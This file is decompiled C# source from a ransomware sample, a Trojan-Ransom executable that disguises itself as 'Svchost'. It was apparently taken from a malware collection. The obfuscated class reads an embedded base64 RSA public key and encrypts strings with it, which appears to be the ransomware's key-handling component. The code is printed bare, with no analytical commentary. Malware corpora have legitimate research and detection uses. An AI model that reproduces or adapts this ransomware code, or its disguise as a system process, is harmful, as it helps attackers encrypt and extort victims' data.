// Decompiled with JetBrains decompiler
// Type: qYAjLWajCJpnf.RWAKpybrscGjni
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace qYAjLWajCJpnf
{
  public static class RWAKpybrscGjni
  {
    private static bool pBLyPFzBmJjc;
    private static readonly string kfCMcllScKy;
    [NonSerialized]
    internal static GetString \u000E;

    public static string tVtoOZjiqyF([In] string obj0)
    {
      int VDazFpVMYV = 0;
      string ozkGDvoilEA = RWAKpybrscGjni.\u000E(107350589);
      RWAKpybrscGjni.lgCQmPVpNp(RWAKpybrscGjni.kfCMcllScKy, out VDazFpVMYV, out ozkGDvoilEA);
      return Convert.ToBase64String(RWAKpybrscGjni.neaLwdwZJyD(Encoding.UTF8.GetBytes(obj0), VDazFpVMYV, ozkGDvoilEA));
    }

    private static byte[] neaLwdwZJyD([In] byte[] obj0, [In] int obj1, [In] string obj2)
    {
      if (obj0 == null || obj0.Length == 0)
        throw new ArgumentException(RWAKpybrscGjni.\u000E(107459152), RWAKpybrscGjni.\u000E(107459163));
      int num = RWAKpybrscGjni.FGZjxUKxguWRemM(obj1);
      if (obj0.Length > num)
        throw new ArgumentException(string.Format(RWAKpybrscGjni.\u000E(107459122), (object) num), RWAKpybrscGjni.\u000E(107459163));
      if (!RWAKpybrscGjni.OcVXpIMfWRp(obj1))
        throw new ArgumentException(RWAKpybrscGjni.\u000E(107459085), RWAKpybrscGjni.\u000E(107459056));
      if (string.IsNullOrEmpty(obj2))
        throw new ArgumentException(RWAKpybrscGjni.\u000E(107459075), RWAKpybrscGjni.\u000E(107459046));
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(obj1))
      {
        cryptoServiceProvider.FromXmlString(obj2);
        return cryptoServiceProvider.Encrypt(obj0, RWAKpybrscGjni.pBLyPFzBmJjc);
      }
    }

    private static int FGZjxUKxguWRemM([In] int obj0) => RWAKpybrscGjni.pBLyPFzBmJjc ? (obj0 - 384) / 8 + 7 : (obj0 - 384) / 8 + 37;

    private static bool OcVXpIMfWRp([In] int obj0) => obj0 >= 384 && obj0 <= 16384 && obj0 % 8 == 0;

    private static void lgCQmPVpNp(
      string dCbGzsHyJJaQrC,
      out int VDazFpVMYV,
      out string ozkGDvoilEA)
    {
      VDazFpVMYV = 0;
      ozkGDvoilEA = RWAKpybrscGjni.\u000E(107350589);
      if (dCbGzsHyJJaQrC == null || dCbGzsHyJJaQrC.Length <= 0)
        return;
      string str = Encoding.UTF8.GetString(Convert.FromBase64String(dCbGzsHyJJaQrC));
      if (!str.Contains(RWAKpybrscGjni.\u000E(107458997)))
        return;
      string[] strArray = str.Split(new char[1]{ '!' }, 2);
      try
      {
        VDazFpVMYV = int.Parse(strArray[0]);
        ozkGDvoilEA = strArray[1];
      }
      catch (Exception ex)
      {
      }
    }

    static RWAKpybrscGjni()
    {
      Strings.CreateGetStringDelegate(typeof (RWAKpybrscGjni));
      RWAKpybrscGjni.pBLyPFzBmJjc = false;
      RWAKpybrscGjni.kfCMcllScKy = RWAKpybrscGjni.\u000E(107458992);
    }
  }
}
